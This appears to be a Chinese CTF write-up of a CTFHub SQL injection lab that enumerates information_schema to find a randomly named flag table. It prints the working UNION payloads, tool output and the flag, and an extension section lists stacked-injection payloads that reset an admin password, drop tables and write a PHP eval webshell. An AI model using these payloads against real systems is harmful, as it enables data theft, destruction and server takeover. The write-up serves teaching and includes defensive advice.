---
layout: post
title: CTFHub - 堆叠注入 MySQL 结构 Writeup
platform: ctfhub
date: 2026-10-21 19:45:00 +0800
categories: CTF
---

CTFHub - 堆叠注入 MySQL 结构 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → 堆叠注入 → **MySQL 结构**）
- 题型：Web
- 考点：**表名/字段名随机**、`information_schema` 枚举


```text
页面标题：CTFHub 技能学习 | MySQL结构
表单：GET，参数名 id，占位提示"输个1试试？"

id=1 的响应（★ 会回显数据，所以 UNION 可用）：
    <code>select * from news where id=1</code>
    ID: 1
    Data: ctfhub

★ 关键发现 1：flag 表的表名是【随机字符串】，不是 "flag"

    0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
    → Data: srulzxvezw,news
            └────┬───┘
        随机生成的表名，猜不到

★ 关键发现 2：那个表的【字段名也是随机的】

    0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name)
         from information_schema.columns where table_schema=database()
    → Data: sqli:srulzxvezw:sqjsmguqeb,sqli:news:id,sqli:news:data
                    └────┬───┘ └────┬────┘
                     表名随机    字段名也随机

★ 关键发现 3：`;` 堆叠注入在这关【用不了】

    1            → ID: 1  Data: ctfhub        （正常）
    1;           → ID: 1  Data: ctfhub        （结尾分号无害）
    1;select 1   → （空白）                    ★ 多语句被拒绝
    1;select 1,2,3 → （空白）

    → 后端用的是 mysqli_query()（单语句），不是 mysqli_multi_query()
    → 这关实际考的是「information_schema 枚举」，不是真的堆叠

★ 解题payload：

    0 union select 1,group_concat(sqjsmguqeb) from srulzxvezw
    → Data: ctfhub{49f253eda9b48ae3ddaba6e1}

    表里只有 1 行（0 union select 1,count(*) from srulzxvezw → 1）

flag         : ctfhub{49f253eda9b48ae3ddaba6e1}
```

二、题目分析

**① 什么是堆叠注入**

```text
普通的 UNION 注入：
    select * from news where id=1 union select 1,database()
    → 只是【一个查询里】多了一个结果集

堆叠注入（Stacked Queries）：
    select * from news where id=1; insert into news values(2,'x')
                                  └┬┘
                              用分号结束第一条
                                  然后执行【第二条独立语句】

★ 区别：堆叠可以执行 INSERT / UPDATE / DELETE / DROP 等
       不只是 SELECT —— 破坏力大得多
```

**前提条件**：

```
后端必须用 mysqli_multi_query() 这类"支持多语句"的 API
如果用 mysqli_query()（最常用），分号后的语句会被直接拒绝
```

**② 这关的真正考点：MySQL 的结构**

```text
这关的名字叫"MySQL结构"，暗示的不是"堆叠"，
而是"你得先搞清楚 MySQL 里数据是怎么组织的"。

因为：
    表名 = srulzxvezw   （随机字符串）
    字段名 = sqjsmguqeb  （随机字符串）

    你不可能猜出来，只能去【系统目录】里查
```

**③ MySQL 的三层结构**

```text
MySQL 服务器
├── 数据库（schema / database）
│   ├── sqli                 ← 当前库
│   │   ├── news             ← 表（字段：id, data）
│   │   └── srulzxvezw       ← 表（字段：sqjsmguqeb）★ 目标
│   ├── mysql                ← 系统库
│   ├── information_schema   ← ★ 元数据库（"目录柜"）
│   └── performance_schema
```

**`information_schema` 里最重要的三张表**：

| 表 | 记录什么 | 关键字段 |
|---|---|---|
| `schemata` | 所有数据库 | `schema_name` |
| `tables` | 所有表 | `table_schema`、`table_name` |
| `columns` | 所有字段 | `table_schema`、`table_name`、`column_name` |

**④ 为什么"一次查全部"很有用**

```text
分开查（三步）：
    ① 查表名    → srulzxvezw, news
    ② 查字段名  → 得先知道表名
    ③ 查数据

一次查（一步）：
    select group_concat(table_schema,0x3a,table_name,0x3a,column_name)
    from information_schema.columns
    where table_schema=database()

    → sqli:srulzxvezw:sqjsmguqeb,sqli:news:id,sqli:news:data
              └────┬───┘ └────┬────┘
            一眼就看出来：哪张表、哪个字段

★ 0x3a 是冒号 ":" 的十六进制（避免引号被过滤/转义）
```

三、解题步骤

**第 1 步：确认注入类型**

```
ID 框输入：1
→ 显示 ID: 1  Data: ctfhub
→ SQL 回显：select * from news where id=1
                            └┬┘
                     没有引号 → 整数型
```

**第 2 步：确认 UNION 可用 + 探字段数**

```
ID 框输入：0 union select 1,2
→ 显示 ID: 1  Data: 2      ✅ UNION 可用，2 个字段
```

**第 3 步：爆库名**

```
ID 框输入：0 union select 1,database()
→ Data: sqli
```

**第 4 步：★ 爆表名（发现随机表名）**

```
ID 框输入：
0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()

→ Data: srulzxvezw,news
```

**📝 关键观察**：

```
news        → 正常的业务表（我们知道它的结构：id、data）
srulzxvezw  → ★ 一串随机字符，明显是出题人新建的 flag 表
```

**第 5 步：★ 一次查清所有表+字段（更高效）**

```
ID 框输入：
0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()

→ Data: sqli:srulzxvezw:sqjsmguqeb,sqli:news:id,sqli:news:data
```

**解读**：

```
sqli : srulzxvezw : sqjsmguqeb
└┬─┘   └────┬───┘   └────┬────┘
数据库    表名        字段名
```

**这样一次就知道**：`srulzxvezw` 表里只有一个字段 `sqjsmguqeb`。

**第 6 步：查数据**

```
ID 框输入：
0 union select 1,group_concat(sqjsmguqeb) from srulzxvezw

→ Data: ctfhub{49f253eda9b48ae3ddaba6e1}
```

**为什么用 `group_concat`**：

```
可以先确认有几行：
    0 union select 1,count(*) from srulzxvezw  → 1

只有 1 行的话，不用 group_concat 也行：
    0 union select 1,sqjsmguqeb from srulzxvezw  → 一样的结果

★ 但养成用 group_concat 的习惯更保险（多行也不漏）
```

**第 7 步：提交 flag → 通关**

---

**顺便验证了 `;` 堆叠在这个环境不可用**

```
1;            → ID: 1  Data: ctfhub    （分号在末尾，无害）
1;select 1    → （空白）                ★ 多语句被拒绝
1;select 1,2,3 → （空白）
```

**原因**：后端用的是 `mysqli_query()`（只允许单条语句），
不是 `mysqli_multi_query()`（允许多条）。

**所以这关虽然叫"堆叠注入"，实际破题靠的是 `information_schema` 枚举。**

---

**用工具一键跑**

```text
双击 sqli-union.bat
→ 粘贴地址 http://challenge-xxx:10800/?id=1
→ 是否字符型：N
```

**工具实测输出**：

```text
③ 爆基础信息
  库名     : sqli
  用户     : root@localhost
  版本     : 10.3.22-MariaDB-0+deb10u1
  系统     : debian-linux-gnu

④ 爆表名
  table_schema=database()  -> srulzxvezw,news

⑤ 爆字段名
  表 srulzxvezw   字段: sqjsmguqeb
       → 生成 payload: ?id=0 union select 1,group_concat(sqjsmguqeb) from srulzxvezw
  表 news         字段: id,data

⑥ 爆数据，找 flag
  SELECT group_concat(sqjsmguqeb) FROM srulzxvezw
     -> ctfhub{49f253eda9b48ae3ddaba6e1}

★ FLAG: ctfhub{49f253eda9b48ae3ddaba6e1}
```

**★ 工具能自动处理随机表名/字段名** —— 因为它本来就是"先查 information_schema，再拼查询"的顺序。

四、延伸知识

**① 堆叠注入真正好用的场景**

```text
当 UNION 被过滤、或者你想要【修改数据】时：

① 插入数据（把 flag 搬到你查得到的表里）
    ?id=1;insert into news(id,data) select 100,secret from secret_table
    → 然后访问 ?id=100 就能看到

② 修改数据
    ?id=1;update users set password='123456' where user='admin'
    → 直接改管理员密码

③ 改表名（CTFHub 下一关就是这个）
    ?id=1;rename table news to news_bak, secret to news
    → 把 secret 表改名成 news，页面就显示它了

④ 删库（破坏性最大）
    ?id=1;drop table users

⑤ 写文件 getshell（需要 FILE 权限）
    ?id=1;select '<?php eval($_POST[1]);?>' into outfile '/var/www/shell.php'
```

**② MySQL 结构速查（注入必备）**

```sql
-- 所有数据库
select schema_name from information_schema.schemata

-- 当前库的所有表
select table_name from information_schema.tables where table_schema=database()

-- 某表的所有字段
select column_name from information_schema.columns where table_name='xxx'

-- ★ 一次拿全（库:表:字段）
select group_concat(table_schema,0x3a,table_name,0x3a,column_name)
from information_schema.columns

-- 当前库名 / 用户 / 版本
select database(), user(), version()

-- 当前库的所有表（带行数估算，能看出哪个表有数据）
select table_name, table_rows from information_schema.tables
where table_schema=database()
```

**③ 为什么出题人要用随机表名/字段名**

```text
目的：防止"盲猜"

如果表名叫 flag、字段名叫 flag，
那 payload 可以背下来：
    0 union select 1,group_concat(flag) from flag

但改成随机名字后：
    · 你必须真的会查 information_schema
    · 你必须理解"库 → 表 → 字段"的三层结构
    · 死记硬背的 payload 全部失效

★ 这是很好的教学设计 —— 逼你理解原理而不是背答案
```

**④ 0x3a 这类十六进制编码的用途**

```text
SQL 注入里，引号经常被过滤（WAF / 代码里的 addslashes）

这时用十六进制代替字符串：
    0x3a  →  ':'        （冒号）
    0x7e  →  '~'        （波浪线，报错注入常用）
    0x20  →  ' '        （空格）
    0x2c  →  ','        （逗号）

也可以用 char() 函数：
    char(58) → ':'
```

**⑤ 防护**

```text
· ★ 参数化查询（根本办法）
· 禁用多语句：用 mysqli_query() 而不是 mysqli_multi_query()
    （PHP 里 PDO 默认也不支持多语句）
· 数据库账号最小权限：
    · 不要给 FILE 权限（防止写文件 getshell）
    · 不要给 DROP / ALTER 权限
· 关闭错误回显
· 输入校验：id 必须是整数 → intval()
```

五、总结

- **本题核心：flag 表的表名和字段名都是随机字符串 → 必须查 `information_schema` 才能知道 → 然后再查数据。**
- 三步拿 flag：

```sql
-- ① 一次查清所有表名和字段名
0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name)
     from information_schema.columns where table_schema=database()
→ sqli:srulzxvezw:sqjsmguqeb,sqli:news:id,sqli:news:data
              └────┬───┘ └────┬────┘
            随机表名      随机字段名

-- ② 直接查那个随机表
0 union select 1,group_concat(sqjsmguqeb) from srulzxvezw

-- ③ 得到 flag
→ ctfhub{49f253eda9b48ae3ddaba6e1}
```

- **三个必记要点**：

```text
① 表名/字段名可以随机 → 别背 payload，要会查 information_schema
② group_concat(a,0x3a,b,0x3a,c) 能一次把"库:表:字段"全打出来
③ 堆叠注入需要 mysqli_multi_query()；
   这关实测用不了（1;select 1 → 空白），实际考的是结构枚举
```
